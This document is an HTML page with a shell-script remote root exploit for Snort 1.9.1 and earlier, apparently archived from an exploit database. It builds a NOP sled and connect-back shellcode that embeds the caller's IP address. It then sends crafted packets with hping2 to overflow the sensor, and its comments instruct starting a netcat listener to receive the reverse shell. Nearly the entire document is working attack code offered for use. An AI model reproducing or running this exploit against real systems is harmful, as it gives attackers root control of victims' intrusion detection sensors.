<html><head><title>Snort <=1.9.1 Remote Root Exploit (p7snort191.sh)
</title></head><pre>#!/bin/sh

##########################################################
# p7snort191.sh by truff (truff@projet7.org)             #
# Snort 1.9.1 and below remote exploit                   #
#                                                        #
# Tested on Slackware 8.0 with Snort 1.9.1 from sources  #
#                                                        #
# Usage:                                                 #
# 1/ Launch a listening netcat to listen for the shell   #
# nc -p 45295 -l                                         #
#                                                        #
# 2/ p7snort119.sh yourIP [Ret_Addr]                     #
#                                                        #
# Where yourIP is the IP where the netcat is listening   #
# and Ret_Addr is the address (8 hexa digits) of the     #
# shellcode (eg: 0819fec2)                               #
#                                                        #
#                                                        #
# This vulnerability was discovered by Bruce Leidl,      #
# Juan Pablo Martinez Kuhn, and Alejandro David Weil     #
# from Core Security Technologies during Bugweek 2003.   #
#                                                        #
# Greetz to #root people and projet7 members.            #
# Special thx to mycroft for helping me with shell       #
# scripting stuff.                                       #
#                                                        #
# www.projet7.org - Security Researchs -                 #
##########################################################


# Put here the path to your hping2 binary
HPING2=/usr/sbin/hping2

# You should change these params to make the snort sensor 
# capture the packets.
IPSRC=192.168.22.1
IPDST=192.168.22.2
PTSRC=3339
PTDST=111



echo &quot;p7snort191.sh by truff (truff@projet7.org)&quot;

case $# in
0)
echo &quot;Bad number of params&quot;
echo &quot;Read comments in sources&quot;
exit -1
;;
1)
RET=0819fec2
echo &quot;Using default retaddr (Slackware 8.0)&quot;
echo $RET
;;
2)
RET=$2
echo &quot;Using custom retaddr&quot;
echo $RET
;;
*)
echo &quot;Bad number of params&quot;
echo &quot;Read comments in sources&quot;
exit -1
;;
esac



# Nops
i=0
while [ &quot;$i&quot; -lt &quot;512&quot; ]; do
i=$(expr &quot;$i&quot; + 1)
echo -n -e &quot;\x90&quot; &gt;&gt; egg
done


# linux x86 shellcode by eSDee of Netric (www.netric.org)
# 131 byte - connect back shellcode (port=0xb0ef)
echo -n -e &quot;\x31\xc0\x31\xdb\x31\xc9\x51\xb1&quot; &gt;&gt; egg
echo -n -e &quot;\x06\x51\xb1\x01\x51\xb1\x02\x51&quot; &gt;&gt; egg
echo -n -e &quot;\x89\xe1\xb3\x01\xb0\x66\xcd\x80&quot; &gt;&gt; egg
echo -n -e &quot;\x89\xc2\x31\xc0\x31\xc9\x51\x51&quot; &gt;&gt; egg
echo -n -e &quot;\x68&quot; &gt;&gt; egg

# IP here 
echo -n -e $(printf &quot;\\\x%02x&quot; $(echo $1 | cut -d. -f1) \
$(echo $1 | cut -d. -f2) \
$(echo $1 | cut -d. -f3) \
$(echo $1 | cut -d. -f4)) &gt;&gt; egg

echo -n -e &quot;\x66\x68\xb0&quot; &gt;&gt; egg
echo -n -e &quot;\xef\xb1\x02\x66\x51\x89\xe7\xb3&quot; &gt;&gt; egg
echo -n -e &quot;\x10\x53\x57\x52\x89\xe1\xb3\x03&quot; &gt;&gt; egg
echo -n -e &quot;\xb0\x66\xcd\x80\x31\xc9\x39\xc1&quot; &gt;&gt; egg 
echo -n -e &quot;\x74\x06\x31\xc0\xb0\x01\xcd\x80&quot; &gt;&gt; egg
echo -n -e &quot;\x31\xc0\xb0\x3f\x89\xd3\xcd\x80&quot; &gt;&gt; egg
echo -n -e &quot;\x31\xc0\xb0\x3f\x89\xd3\xb1\x01&quot; &gt;&gt; egg
echo -n -e &quot;\xcd\x80\x31\xc0\xb0\x3f\x89\xd3&quot; &gt;&gt; egg
echo -n -e &quot;\xb1\x02\xcd\x80\x31\xc0\x31\xd2&quot; &gt;&gt; egg
echo -n -e &quot;\x50\x68\x6e\x2f\x73\x68\x68\x2f&quot; &gt;&gt; egg
echo -n -e &quot;\x2f\x62\x69\x89\xe3\x50\x53\x89&quot; &gt;&gt; egg
echo -n -e &quot;\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0&quot; &gt;&gt; egg
echo -n -e &quot;\x01\xcd\x80&quot; &gt;&gt; egg

# 3 dummy bytes for alignment purposes
echo -n -e &quot;\x41\x41\x41&quot; &gt;&gt; egg

i=0
cpt=$(expr 3840 - 134 - 512)
cpt=$(expr $cpt / 4)


var1=0x$(echo $RET | cut -b7,8)
var2=0x$(echo $RET | cut -b5,6)
var3=0x$(echo $RET | cut -b3,4)
var4=0x$(echo $RET | cut -b1,2)

while [ &quot;$i&quot; -lt &quot;$cpt&quot; ]; do
i=$(expr &quot;$i&quot; + 1)
echo -n -e $(printf &quot;\\\x%02x&quot; $var1 $var2 $var3 $var4) &gt;&gt; egg
done


# hping ruleZ
$HPING2 $IPDST -a $IPSRC -s $PTSRC -p $PTDST --ack --rst -c 1 \
-d 0x1 --setseq 0xffff0023 --setack 0xc0c4c014 \
1&gt;/dev/null 2&gt;/dev/null

$HPING2 $IPDST -a $IPSRC -s $PTSRC -p $PTDST --ack --rst -c 1 \
-d 0xF00 -E egg --setseq 0xffffffff --setack 0xc0c4c014 \
1&gt;/dev/null 2&gt;/dev/null

$HPING2 $IPSRC -a $IPDST -s $PTDST -p $PTSRC --ack -c 1 \
-d 0 --setseq 0xc0c4c014 --setack 0xffffffff \
1&gt;/dev/null 2&gt;/dev/null

rm egg

echo &quot;Exploit Sended&quot;

# milw0rm.com [2003-04-23]</pre></html>